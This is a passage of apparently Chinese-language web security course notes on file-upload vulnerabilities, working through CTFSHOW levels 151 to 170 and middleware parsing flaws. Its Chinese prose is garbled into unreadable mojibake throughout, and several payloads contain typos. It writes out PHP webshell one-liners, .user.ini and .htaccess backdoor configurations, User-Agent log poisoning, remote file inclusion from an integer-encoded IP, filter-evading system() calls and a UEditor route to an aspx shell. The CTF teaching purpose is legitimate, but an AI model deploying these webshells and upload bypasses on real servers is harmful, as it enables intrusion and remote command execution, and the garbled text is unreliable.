href="https://so.csdn.net/so/search?q=PHP%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020">PHPè¯­è¨€</a>ç‰¹æ€§</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-3"><a href="#è¯¦ç»†ç‚¹ï¼š-3" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p>1ã€æ£€æµ‹å±‚é¢ï¼šå‰ç«¯ï¼Œåç«¯ç­‰<br>2ã€æ£€æµ‹å†…å®¹ï¼šæ–‡ä»¶å¤´ï¼Œå®Œæ•´æ€§ï¼ŒäºŒæ¬¡æ¸²æŸ“ç­‰<br>3ã€æ£€æµ‹åç¼€ï¼šé»‘åå•ï¼Œç™½åå•ï¼ŒMMEæ£€æµ‹ç­‰<br>4ã€ç»•è¿‡æŠ€å·§ï¼šå¤šåç¼€è§£æï¼Œæˆªæ–­ï¼Œä¸­é—´ä»¶ç‰¹æ€§ï¼Œæ¡ä»¶ç«Ÿäº‰ç­‰</p>
<h4 id="æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š"><a href="#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š" class="headerlink" title="#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š"></a>#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š</h4><p>1ã€æ–‡ä»¶ä¸Šä¼ -CTFèµ›é¢˜çŸ¥è¯†ç‚¹<br>2ã€æ–‡ä»¶ä¸Šä¼ ä¸­é—´ä»¶è§£æ&amp;ç¼–è¾‘å™¨å®‰å…¨<br>3ã€æ–‡ä»¶ä¸Šä¼ -å®ä¾‹CMSæ–‡ä»¶ä¸Šä¼ å®‰å…¨åˆ†æ</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-10"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-10" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>CTFSHOWæ–‡ä»¶ä¸Šä¼ -151åˆ°161å…³å¡<br>151å…³ å‰ç«¯è¿‡æ»¤â€“ç›´æ¥ä¿®æ”¹å‰ç«¯å…è®¸ä¸Šä¼ çš„ç±»å‹ç»•è¿‡<br>152å…³ å‰åç«¯åŒæ—¶è¿‡æ»¤â€“ä¿®æ”¹å‰ç«¯ä»£ç å…è®¸phpæ–‡ä»¶ä¸Šä¼ â€“burpæŠ“åŒ…ä¿®æ”¹content-typeä¸ºimage&#x2F;pngç»•è¿‡<br>153å…³ å‰åç«¯è¿‡æ»¤åŒæ—¶ä¸¥æ ¼è¿‡æ»¤å‚æ•°â€“ä¸Šä¼ .user.inié…ç½®æ–‡ä»¶å¹¶å°†å†…å®¹å†™ä¸ºauto_prepend_file&#x3D;test.txtâ€“ä¸Šä¼ å†™æœ‰webshellçš„æ–‡ä»¶ï¼ˆå¯ä»¥ä¸ºtextä¹Ÿå¯ä»¥ä¸ºpngï¼‰â€“è®¿é—®index.phpå³å¯åå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¡¥å……çŸ¥è¯†ï¼š</span><br><span class="line"></span><br><span class="line">é…ç½®æ–‡ä»¶ ï¼šphp.ini</span><br><span class="line">é…ç½®æ–‡ä»¶ï¼ˆphp.iniï¼‰åœ¨ PHP å¯åŠ¨æ—¶è¢«è¯»å–ã€‚å¯¹äºæœåŠ¡å™¨æ¨¡å—ç‰ˆæœ¬çš„ PHPï¼Œä»…åœ¨ web æœåŠ¡å™¨å¯åŠ¨æ—¶è¯»å–ä¸€æ¬¡ã€‚å¯¹äº CGI å’Œ</span><br><span class="line">CLI ç‰ˆæœ¬ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½ä¼šè¯»å–ã€‚(PHP: é…ç½®æ–‡ä»¶ - Manual)</span><br><span class="line">å®é™…ä¸Šï¼Œé™¤äº†PHP_INI_SYSTEMä»¥å¤–çš„æ¨¡å¼éƒ½æ˜¯å¯ä»¥é€šè¿‡.user.iniæ¥è®¾ç½®çš„ã€‚è€Œä¸”ï¼Œå’Œphp.iniä¸åŒçš„æ˜¯ï¼Œ.user.iniæ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´ä¿®æ”¹äº†.user.iniåï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…user_ini.cache_ttlæ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€‚</span><br><span class="line">è¿™é‡Œå°±å¾ˆæ¸…æ¥šäº†ï¼Œ.user.iniå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€è‡ªå®šä¹‰â€œçš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR</span><br><span class="line">ã€ PHP_INI_USERâ€çš„è®¾ç½®ã€‚</span><br><span class="line">å…¶ä¸­æœ‰ä¸¤ä¸ªé…ç½®ï¼Œå¯ä»¥ç”¨æ¥åˆ¶é€ åé—¨ï¼š</span><br><span class="line">auto_append_file ; æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ã€‚</span><br><span class="line">auto_prepend_file ;æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶åã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br><span class="line">auto_prepend_file=test.txt</span><br><span class="line">æˆ–è€…</span><br><span class="line">auto_append_file=test.txt</span><br></pre></td></tr></table></figure>

<p>154155å…³-JSéªŒè¯+User.ini+çŸ­æ ‡ç­¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?echo &#x27;123&#x27; ?&gt; //å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short open tags=on &lt;=(è¡¨è¾¾å¼ï¼‰ï¼Ÿ&gt;</span><br><span class="line">//ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½® &lt;%echo â€˜123â€™;%&gt; / /å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°asp tags=on</span><br><span class="line"></span><br><span class="line">//ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ user.ini:auto_prepend_file=test.png test.png:&lt;?=eval($_POST[x]);?&gt; æ€è·¯ï¼šå…ˆå°è¯•å›¾ç‰‡æ–‡ä»¶ï¼ˆå‘ç°éªŒè¯ä¸é€šè¿‡ï¼‰--ä¿®æ”¹å‰ç«¯ä»£ç ï¼ˆå­˜åœ¨åç«¯éªŒè¯ï¼‰--burpä¿®æ”¹æ–‡ä»¶ç±»å‹--ä»æç¤ºæ–‡ä»¶ç±»å‹é”™è¯¯ï¼ˆå°è¯•ä¸Šä¼ user.iniæ–‡ä»¶ï¼‰--å¯¹pngæ–‡ä»¶ä¸­çš„ä»£ç è¿›è¡Œè¿‡æ»¤ï¼ˆä¼šæ£€æŸ¥æ–‡ä»¶ä¸­&lt;? php ?&gt;ï¼‰ä¸­çš„phpå­—æ®µ--ä½¿ç”¨ä¸å«phpå­—æ®µçš„ä»£ç ï¼ˆæ¯”å¦‚ :&lt;?=eval($_POST[x]);?&gt;ï¼‰</span><br></pre></td></tr></table></figure>

<p>156å…³ JSéªŒè¯+user.ini+çŸ­æ ‡ç­¾+è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿‡æ»¤ []</span><br><span class="line">user.ini:auto_prepend_file=test.png</span><br><span class="line">test png:&lt;?=eval($_POST&#123;x&#125;),?&gt;</span><br></pre></td></tr></table></figure>

<p>157-158-159JSéªŒè¯+user ini+çŸ­æ ‡ç­¾+è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.ini: auto_prepend_file=test.png</span><br><span class="line">test.png:&lt;?=system(&#x27;tac../fl*&#x27;)?&gt;</span><br><span class="line">test.png:&lt;?=&#x27;tac../fl*&#x27;)?&gt; //ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦çš„æ•ˆæœä¸å‡½æ•°shell exec(ç›¸åŒ )</span><br><span class="line">test.png:&lt;echo &#x27;tac /var/www/htmlf*?&gt;</span><br></pre></td></tr></table></figure>

<p>160-JSéªŒè¯+User.ini-çŸ­æ ‡ç­¾+è¿‡å¾·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å†è¿‡æ»¤ä¸¥æ ¼çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é‡‡ç”¨é€šè¿‡burpå°†åé—¨ä»£ç å†™å…¥UAå¤´ä¸­ï¼Œç„¶åå†™å…¥.user.inié…ç½®æ–‡ä»¶ï¼Œå°†æ—¥å¿—æ–‡ä»¶é€šè¿‡æ–‡ä»¶åŒ…å«è®¿é—®ï¼Œé‚£ä¹ˆåœ¨è®¿é—®pngæ–‡ä»¶æ—¶å°±æ˜¯è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œå°±ä¼šæ˜¾ç¤ºåé—¨ä»£ç ä»è€Œè¾¾åˆ°è°ƒç”¨çš„ç›®çš„</span><br><span class="line">åŒ…å«é»˜è®¤æ—¥å¿—ï¼Œæ—¥å¿—è®°å½•UAå¤´ï¼ŒUAå¤´å†™åé—¨ä»£ç </span><br><span class="line">user.ini:auto_prepend_file-test.png</span><br><span class="line">test.png:&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>161-JSéªŒè¯+User.ni+çŸ­æ ‡ç­¾+è¿‡æ»¤+æ–‡ä»¶å¤´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶å¤´éƒ¨æ£€æµ‹æ˜¯å¦ä¸ºå›¾ç‰‡æ ¼å¼æ–‡ä»¶</span><br><span class="line">user ini:GIF89A auto_prepend_file=test.png</span><br><span class="line">test.png:GIF89A &lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¡¥å……ï¼šä¸»è¦å°±æ˜¯å¯ä»¥å»ctfshowä¸Šå»åˆ·é¢˜ï¼Œä¸Šé¢çš„é¢˜å¾ˆå¥½ï¼Œè€Œä¸”è¿™ä¸ªçŸ¥è¯†ç‚¹ä¹Ÿæ˜¯ctfçš„å¸¸è€ƒã€‚</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬32å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-æ–‡ä»¶ä¸Šä¼ -äºŒæ¬¡æ´¹æŸ“8-htaccess-å˜å¼‚å…æ€"><a href="#ç¬¬32å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-æ–‡ä»¶ä¸Šä¼ -äºŒæ¬¡æ´¹æŸ“8-htaccess-å˜å¼‚å…æ€" class="headerlink" title="ç¬¬32å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;æ–‡ä»¶ä¸Šä¼ &amp;äºŒæ¬¡æ´¹æŸ“8&amp;htaccess&amp;å˜å¼‚å…æ€"></a>ç¬¬32å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;æ–‡ä»¶ä¸Šä¼ &amp;äºŒæ¬¡æ´¹æŸ“8&amp;htaccess&amp;å˜å¼‚å…æ€</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-15"><a href="#çŸ¥è¯†ç‚¹ï¼š-15" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æ–‡ä»¶ä¸Šä¼ -äºŒæ¬¡æ¸£æŸ“<br>2ã€æ–‡ä»¶ä¸Šä¼ -ç®€å•å…æ€å˜å¼‚<br>3ã€æ–‡ä»¶ä¸Šä¼ -.htaccesså¦™ç”¨<br>4ã€æ–‡ä»¶ä¸Šä¼ -PHPè¯­è¨€ç‰¹æ€§</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-4"><a href="#è¯¦ç»†ç‚¹ï¼š-4" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p>1ã€æ£€æµ‹å±‚é¢ï¼šå‰ç«¯ï¼Œåç«¯ç­‰<br>2ã€æ£€æµ‹å†…å®¹ï¼šæ–‡ä»¶å¤´ï¼Œå®Œæ•´æ€§ï¼ŒäºŒæ¬¡æ¸£æŸ“ç­‰<br>3ã€æ£€æµ‹åç¼€ï¼šé»‘åå•ï¼Œç™½åå•ï¼ŒMIMEæ£€æµ‹ç­‰<br>4ã€ç»•è¿‡æŠ€å·§ï¼šå¤šåç¼€è§£æï¼Œæˆªæ–­ï¼Œä¸­é—´ä»¶ç‰¹æ€§ï¼Œæ¡ä»¶ç«äº‰ç­‰</p>
<h4 id="æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š-1"><a href="#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š-1" class="headerlink" title="#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š"></a>#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š</h4><p>1ã€æ–‡ä»¶ä¸Šä¼ -CTFèµ›é¢˜çŸ¥è¯†ç‚¹<br>2ã€æ–‡ä»¶ä¸Šä¼ -ä¸­é—´ä»¶è§£æ&amp;ç¼–è¾‘å™¨å®‰å…¨</p>
<p>3ã€æ–‡ä»¶ä¸Šä¼ -å®ä¾‹CMSæ–‡ä»¶ä¸Šä¼ å®‰å…¨åˆ†æ</p>
<h4 id="å‰ç½®ï¼š"><a href="#å‰ç½®ï¼š" class="headerlink" title="#å‰ç½®ï¼š"></a>#å‰ç½®ï¼š</h4><p>åé—¨ä»£ç éœ€è¦ç”¨ç‰¹å®šæ ¼å¼åç¼€è§£æï¼Œä¸èƒ½ä»¥å›¾ç‰‡åç¼€è§£æè„šæœ¬åé—¨ä»£ç (è§£ææ¼æ´é™¤å¤–)<br>å¦‚ï¼šjpgå›¾ç‰‡é‡Œé¢æœ‰phpåé—¨ä»£ç ï¼Œä¸èƒ½è¢«è§¦å‘ï¼Œæ‰€ä»¥è¿æ¥ä¸ä¸Šåé—¨</p>
<h4 id="äºŒæ¬¡æ¸²æŸ“åˆ¤æ–­ï¼š-â€”â€”è¾ƒéš¾"><a href="#äºŒæ¬¡æ¸²æŸ“åˆ¤æ–­ï¼š-â€”â€”è¾ƒéš¾" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“åˆ¤æ–­ï¼š        â€”â€”è¾ƒéš¾"></a>äºŒæ¬¡æ¸²æŸ“åˆ¤æ–­ï¼š        â€”â€”è¾ƒéš¾</h4><p>1ã€ä¸Šä¼ å‰åæ–‡ä»¶å¤§å°ä¸åŒ<br>2ã€ä¸Šä¼ åå›¾ç‰‡è¿”å›å†…å®¹åŒ…å«æ˜æ˜¾çš„äºŒæ¬¡æ¸²æŸ“æ ‡å¿—</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-11"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-11" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>CTFSHOW-æ–‡ä»¶ä¸Šä¼ -162åˆ°170å…³å¡<br>162 çªç ´è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿‡æ»¤ . () &#123;&#125; ç­‰</span><br><span class="line">åˆ©ç”¨è¿œç¨‹åŒ…å«IPè½¬æ¢åœ°å€åé—¨è°ƒç”¨æ‰§è¡Œ</span><br><span class="line">.user.ini auto_prepend_file=png</span><br><span class="line">png &lt;?=includeâ€™http://794750069/&gt;</span><br><span class="line">https://www.bejson.com/convert/ip2int/</span><br></pre></td></tr></table></figure>

<p>163 çªç ´ä¸Šä¼ åˆ·é™¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿‡æ»¤ . () &#123;&#125;ç­‰åŒæ—¶æ–‡ä»¶è¢«åˆ æµ‹é™¤</span><br><span class="line">ç›´æ¥åˆ©ç”¨user.iniåŒ…å«è¿œç¨‹</span><br><span class="line">auto_prepend_file=http://794750069/</span><br><span class="line">auto_prepend_file=http://794750069/</span><br></pre></td></tr></table></figure>

<p>164 pngäºŒæ¬¡æ¸²æŸ“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https //blog.csdn.net/qq 40800734/article/details/105920149</span><br><span class="line">getï¼š0=system postï¼š1=tac flag.php</span><br><span class="line">å°†åé—¨ä»£ç å†™å…¥å›¾ç‰‡ï¼ˆå‰æï¼Œè¯»å–æ–‡ä»¶æ˜¯é€šè¿‡phpè§£æï¼Œå¯¼è‡´åé—¨ä»£ç å¯æ‰§è¡Œï¼‰</span><br></pre></td></tr></table></figure>

<p>165 jpgäºŒæ¬¡æ¸²æŸ“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€å…ˆä¸Šä¼ jpgæ­£å¸¸ï¼Œè¿”å›åŒ…å‘ç°æ¸²æŸ“</span><br><span class="line">2ã€ä¸Šä¼ jpgæ¸²æŸ“åä¿å­˜ï¼Œç”Ÿæˆå¸¦ä»£ç å›¾ç‰‡</span><br><span class="line">è°ƒç”¨æ‰§è¡Œï¼šphp jpg .php 1.jpg</span><br></pre></td></tr></table></figure>

<p>166 zipè°ƒç”¨åŒ…å«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç›´æ¥ä¸Šä¼ zipåä¿®æ”¹ä»£ç </span><br><span class="line"></span><br><span class="line">&lt;?=eval($POST[x]),?&gt;</span><br></pre></td></tr></table></figure>

<p>167 .htaccesså¦™ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.htaccessé»˜è®¤ä¸æ”¯æŒnginx,è®¾ç½®åæ”¯æŒ</span><br><span class="line">.htaccesså¯ä»¥é€šè¿‡è®¾ç½®å®ç°æ–‡ä»¶è§£æé…ç½®</span><br><span class="line">å°†pngåç¼€çš„æ–‡ä»¶è§£ææˆphp</span><br><span class="line">AddType application/x-httpd-php png</span><br><span class="line">å°†pngåç¼€çš„æ–‡ä»¶è§£ææˆphp</span><br></pre></td></tr></table></figure>

<p>168 å…æ€åé—¨ï¼ˆæ„é€ å˜é‡ç»•è¿‡å‡½æ•°è¿‡æ»¤ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $a=&#x27;syste&#x27;;$b=&#x27;m&#x27;,$c=$a.$b;$c(tac ./flagaa.php&#x27;):?&gt;</span><br></pre></td></tr></table></figure>

<p>169 170 æ—¥å¿—åŒ…å«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ„é€ .user.inåˆ©ç”¨æ¡ä»¶ï¼šä¸Šä¼ index.phpå†…å®¹éšæ„</span><br><span class="line">ä¸Šä¼ .user.iniåŒ…å«æ—¥å¿—ï¼šauto_prepend_fle=var/log/nginx/access.log</span><br><span class="line">è®¿é—®åœ°å€å¸¦åé—¨UAå¤´å†™å…¥æ—¥å¿—ï¼š&lt;ï¼Ÿ=eval($POST[X):?&gt;</span><br><span class="line">ä¸Šä¼ .user.iniæ˜¯åˆ©ç”¨æ–‡ä»¶åŒ…å« ä¸Šä¼ .htaccessæ˜¯åˆ©ç”¨æ–‡ä»¶è§£ææ¼æ´</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬33å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-æ–‡ä»¶ä¸Šä¼ -ä¸­é—´ä»¶è§£ææ¼æ´8ä¼¼ç¼–å™¨å®‰å…¨"><a href="#ç¬¬33å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-æ–‡ä»¶ä¸Šä¼ -ä¸­é—´ä»¶è§£ææ¼æ´8ä¼¼ç¼–å™¨å®‰å…¨" class="headerlink" title="ç¬¬33å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;æ–‡ä»¶ä¸Šä¼ &amp;ä¸­é—´ä»¶è§£ææ¼æ´8ä¼¼ç¼–å™¨å®‰å…¨"></a>ç¬¬33å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;æ–‡ä»¶ä¸Šä¼ &amp;ä¸­é—´ä»¶è§£ææ¼æ´8ä¼¼ç¼–å™¨å®‰å…¨</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-16"><a href="#çŸ¥è¯†ç‚¹ï¼š-16" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æ–‡ä»¶ä¸Šä¼ -äºŒæ¬¡æ¸£æŸ“<br>2ã€æ–‡ä»¶ä¸Šä¼ -ç®€å•å…æ€å˜å¼‚<br>3ã€æ–‡ä»¶ä¸Šä¼ -.htaccesså¦™ç”¨<br>4ã€æ–‡ä»¶ä¸Šä¼ -PHPè¯­è¨€ç‰¹æ€§</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-5"><a href="#è¯¦ç»†ç‚¹ï¼š-5" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p>1ã€æ£€æµ‹å±‚é¢ï¼šå‰ç«¯ï¼Œåç«¯ç­‰<br>2ã€æ£€æµ‹å†…å®¹ï¼šæ–‡ä»¶å¤´ï¼Œå®Œæ•´æ€§ï¼ŒäºŒæ¬¡æ¸£æŸ“ç­‰<br>3ã€æ£€æµ‹åç¼€ï¼šé»‘åå•ï¼Œç™½åå•ï¼ŒMIMEæ£€æµ‹ç­‰<br>4ã€ç»•è¿‡æŠ€å·§ï¼šå¤šåç¼€è§£æï¼Œæˆªæ–­ï¼Œä¸­é—´ä»¶ç‰¹æ€§ï¼Œæ¡ä»¶ç«äº‰ç­‰</p>
<h4 id="æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š-2"><a href="#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š-2" class="headerlink" title="#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š"></a>#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š</h4><p>1ã€æ–‡ä»¶ä¸Šä¼ -CTFèµ›é¢˜çŸ¥è¯†ç‚¹<br>2ã€æ–‡ä»¶ä¸Šä¼ -ä¸­é—´ä»¶è§£æ&amp;ç¼–è¾‘å™¨å®‰å…¨<br>3ã€æ–‡ä»¶ä¸Šä¼ -å®ä¾‹CMSæ–‡ä»¶ä¸Šä¼ å®‰å…¨åˆ†æ</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-12"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-12" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ä¸­é—´ä»¶æ–‡ä»¶è§£æ-lIS&amp;Apache&amp;Nginx<br>Webåº”ç”¨ç¼–è¾‘å™¨-Ueditoræ–‡ä»¶ä¸Šä¼ å®‰å…¨<br>å®ä¾‹CMS&amp;å¹³å°-ä¸­é—´ä»¶è§£æ&amp;ç¼–è¾‘å™¨å¼•ç”¨</p>
<p>#ä¸­é—´ä»¶æ–‡ä»¶è§£æ-llS&amp;Apache&amp;Nginx<br>IIS 6 7æ–‡ä»¶åç›®å½•å<br>1ã€æ–‡ä»¶åï¼šX.asp;.x.jpg<br>2ã€ç›®å½•åï¼šx.asp&#x2F;x.jpg<br>3ã€S7.Xä¸Nginxè§£ææ¼æ´ä¸€è‡´<br>(è¯¥æ¼æ´å®ç°çš„æ¡ä»¶ï¼š1ä¸­é—´ä»¶ç±»å‹ä¸ºIISä¸”ç‰ˆæœ¬å¯¹åº” 2ã€ä¸Šä¼ æ–‡ä»¶èƒ½ä¸èƒ½ä¿®æ”¹ç›®å½•æˆ–ä¸Šä¼ çš„æ–‡ä»¶åèƒ½å¢åŠ å‘½å)<br>(æ¼æ´é˜²æŠ¤ï¼šä¸¥æ ¼å‘½åè§„åˆ™ï¼šåŸºäºæœ¬åœ°åå‘½åã€åŸºäºæ—¶é—´å‘½åã€åŸºäºéšæœºå­—ç¬¦å‘½å ä¸Šä¼ çš„æ–‡ä»¶åå›ºå®šä¸”ç›®å½•æ— æ³•åˆ›å»ºåˆ™æ¼æ´æ— æ³•å®ç°ï¼‰</p>
<h4 id="Apacheæ¢è¡Œè§£æé…ç½®ä¸å½“"><a href="#Apacheæ¢è¡Œè§£æé…ç½®ä¸å½“" class="headerlink" title="#Apacheæ¢è¡Œè§£æé…ç½®ä¸å½“"></a>#Apacheæ¢è¡Œè§£æé…ç½®ä¸å½“</h4><p>1ã€æ¢è¡Œè§£æ-CVE-2017-15715      <a href="https://blog.csdn.net/youthbelief/article/details/121258770">https://blog.csdn.net/youthbelief/article/details/121258770</a>   å¤ç°æ–‡ç« <br>å…¶2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´</p>
<p>2ã€é…ç½®ä¸å½“-.htaccessé…ç½®ä¸å½“<br>AddHandier application&#x2F;x-httpd-php .php</p>
<h4 id="Nginx-æ–‡ä»¶åé€»è¾‘è§£ææ¼æ´"><a href="#Nginx-æ–‡ä»¶åé€»è¾‘è§£ææ¼æ´" class="headerlink" title="#Nginx æ–‡ä»¶åé€»è¾‘è§£ææ¼æ´"></a><strong>#Nginx æ–‡ä»¶åé€»è¾‘è§£ææ¼æ´</strong></h4><p>1,æ–‡ä»¶åé€»è¾‘-CVE-2013-4547<br>å½±å“ç‰ˆæœ¬ï¼šNginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7<br>æ³¨æ„æ­¤å¤„æ–‡ä»¶ååè¦åŠ ç©ºæ ¼</p>
<p>2.è§£ææ¼æ´-nginx.confé…ç½®ä¸å½“<br>ç”±æ­¤å¯çŸ¥ï¼Œè¯¥æ¼æ´ä¸Nginxã€phpç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´ã€‚</p>
<h4 id="Webåº”ç”¨ç¼–è¾‘å™¨-Ueditoræ–‡ä»¶ä¸Šä¼ å®‰å…¨"><a href="#Webåº”ç”¨ç¼–è¾‘å™¨-Ueditoræ–‡ä»¶ä¸Šä¼ å®‰å…¨" class="headerlink" title="#Webåº”ç”¨ç¼–è¾‘å™¨-Ueditoræ–‡ä»¶ä¸Šä¼ å®‰å…¨"></a><strong>#Webåº”ç”¨ç¼–è¾‘å™¨-Ueditoræ–‡ä»¶ä¸Šä¼ å®‰å…¨</strong></h4><p>æ€è·¯ï¼šåˆ¶ä½œå›¾ç‰‡é©¬â€“å°†å›¾ç‰‡é©¬ä¸Šä¼ åˆ°vpsâ€“ä¸Šè¿°ä»£ç ä¿å­˜ä¸ºhtmlæ–‡ä»¶ï¼Œå°†è®¿é—®åœ°å€ä¿®æ”¹ä¸ºç¼–è¯‘å™¨åœ°å€â€”è®¿é—®htmlæ–‡ä»¶å°†å›¾ç‰‡é©¬åœ°å€å¡«å…¥ï¼ˆæ„é€ å¥½çš„<a href="http://xxxx/ueditor.jpg?.aspx%EF%BC%89%E2%80%93%E7%82%B9%E5%87%BBsubmit%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%EF%BC%8C%E5%B9%B6%E8%BF%94%E5%9B%9E%E6%88%91%E4%BB%AC%E7%9A%84aspx%E8%84%9A%E6%9C%AC%E6%9C%A8%E9%A9%AC%E8%B7%AF%E5%BE%84%E5%9C%B0%E5%9D%80%E2%80%93shell%E8%BF%9E%E6%8E%A5">http://xxxx/ueditor.jpg?.aspxï¼‰â€“ç‚¹å‡»submitï¼Œç›´æ¥ä¸Šä¼ æˆåŠŸï¼Œå¹¶è¿”å›æˆ‘ä»¬çš„aspxè„šæœ¬æœ¨é©¬è·¯å¾„åœ°å€â€“shellè¿æ¥</a><br>å‚è€ƒæ–‡ç« ï¼š<a href="https://codeleading.com/article/27805571408/#google_vignette">https://codeleading.com/article/27805571408/#google_vignette</a></p>
